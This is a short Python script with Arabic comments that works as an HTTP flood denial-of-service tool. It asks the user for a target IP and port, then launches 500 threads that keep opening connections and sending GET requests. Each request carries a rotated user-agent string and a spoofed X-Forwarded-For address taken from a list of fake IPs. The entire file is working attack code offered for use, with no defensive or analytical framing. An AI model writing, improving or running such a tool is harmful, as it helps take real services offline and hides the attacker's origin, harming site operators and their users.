import socket
import threading
import random
import time

# إدخال عنوان IP الهدف والمنفذ من المستخدم
target = input("Enter the target IP: ")  # أدخل عنوان IP الهدف
port = int(input("Enter the target port: "))  # أدخل المنفذ الهدف

# قائمة من عناوين IP وهمية
fake_ips = [
    '182.21.20.32',
    '110.45.80.102',
    '192.168.1.1',
    '10.0.0.1',
    '172.16.0.1'
]

# قائمة من عوامل المستخدم
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML، مثل Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
]

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            # اختيار عنوان IP وهمي عشوائي
            fake_ip = random.choice(fake_ips)
            
            # اختيار عامل مستخدم عشوائي
            user_agent = random.choice(user_agents)
            
            # تجهيز الطلب
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nX-Forwarded-For: {fake_ip}\r\n\r\n"
            
            # إرسال الطلب
            s.send(request.encode('ascii'))
            
            # إغلاق الاتصال
            s.close()
            
            # تأخير عشوائي بين الطلبات
            time.sleep(random.uniform(0.1, 1.0))
        except socket.error:
            print("Error connecting to target")
            break

# زيادة عدد الاتصالات المتزامنة
for i in range(500):  # يمكنك زيادة أو تقليل العدد حسب قدرات جهازك
    thread = threading.Thread(target=attack)
    thread.start()